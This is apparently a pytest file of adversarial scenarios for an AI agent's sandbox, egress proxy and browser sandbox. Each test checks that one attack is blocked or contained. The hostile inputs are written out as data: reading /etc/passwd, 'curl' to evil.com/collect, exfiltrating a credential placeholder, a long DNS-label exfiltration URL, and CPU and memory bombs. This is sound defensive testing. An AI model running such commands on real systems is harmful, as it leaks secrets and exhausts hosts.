"""M3.A1-A8 adversarial sandbox/proxy/browser scenarios."""

from __future__ import annotations

import sys
from pathlib import Path

from shisad.core.types import CredentialRef, TaintLabel
from shisad.executors.browser import BrowserSandbox, BrowserSandboxPolicy
from shisad.executors.mounts import FilesystemPolicy, MountRule
from shisad.executors.proxy import EgressProxy, NetworkPolicy
from shisad.executors.sandbox import (
    DegradedModePolicy,
    ResourceLimits,
    SandboxConfig,
    SandboxOrchestrator,
)
from shisad.security.credentials import CredentialConfig, InMemoryCredentialStore
from shisad.security.firewall.output import OutputFirewall


def _resolver(_hostname: str) -> list[str]:
    return ["93.184.216.34"]


def test_m3_a1_host_filesystem_access_blocked(tmp_path: Path) -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="file.read",
            command=[sys.executable, "-c", "print('noop')"],
            read_paths=["/etc/passwd"],
            filesystem=FilesystemPolicy(
                mounts=[MountRule(path=f"{tmp_path.as_posix()}/**", mode="ro")],
            ),
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert result.allowed is False
    assert result.reason == "filesystem:outside_mounts"


def test_m3_a2_host_network_access_blocked() -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="http_request",
            command=[sys.executable, "-c", "print('noop')"],
            network_urls=["https://evil.com/collect"],
            network=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert result.allowed is False
    assert result.reason == "network:host_not_allowlisted"


def test_m3_a3_forkbomb_like_payload_times_out() -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=[sys.executable, "-c", "while True: pass"],
            limits=ResourceLimits(timeout_seconds=1, output_bytes=1024, pids=16),
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert result.allowed is True
    assert result.timed_out is True


def test_m3_a4_memory_allocation_bomb_hits_resource_limits() -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=[sys.executable, "-c", "x = 'a' * (512 * 1024 * 1024); print(len(x))"],
            limits=ResourceLimits(timeout_seconds=5, memory_mb=64, output_bytes=2048),
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert result.allowed is True
    assert result.exit_code is None or result.exit_code != 0


def test_m3_a5_dns_exfiltration_attempt_blocked() -> None:
    proxy = EgressProxy(resolver=_resolver)
    label = "q3f" * 24
    decision = proxy.authorize_request(
        tool_name="http_request",
        url=f"https://{label}.api.good.com/collect",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["*.api.good.com"]),
    )
    assert decision.allowed is False
    assert decision.reason == "dns_exfil_suspected"


def test_m3_a6_browser_sensitive_paste_blocked(tmp_path: Path) -> None:
    browser = BrowserSandbox(
        output_firewall=OutputFirewall(safe_domains=["api.good.com"]),
        screenshots_dir=tmp_path / "shots",
        policy=BrowserSandboxPolicy(clipboard="enabled"),
    )
    result = browser.paste(
        "paste secret",
        taint_labels={TaintLabel.USER_CREDENTIALS},
    )
    assert result.allowed is False
    assert result.reason == "sensitive_taint_clipboard"


def test_m3_a7_credential_exfil_placeholder_remains_useless() -> None:
    store = InMemoryCredentialStore()
    store.register(
        CredentialRef("gmail_primary"),
        "real-secret-value",
        CredentialConfig(allowed_hosts=["api.good.com"]),
    )
    placeholder = store.get_placeholder(CredentialRef("gmail_primary"))
    proxy = EgressProxy(credential_store=store, resolver=_resolver)
    decision = proxy.authorize_request(
        tool_name="http_request",
        url="https://evil.com/collect",
        body=f"dump={placeholder}",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["evil.com"]),
        approved_by_pep=True,
    )
    assert decision.allowed is False
    assert decision.reason == "placeholder_exfiltration_blocked"


def test_m3_a8_direct_network_bypass_command_blocked() -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=["curl", "https://evil.com/collect"],
            network=NetworkPolicy(allow_network=False, allowed_domains=[]),
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert result.allowed is False
    assert result.reason == "network:network_disabled"
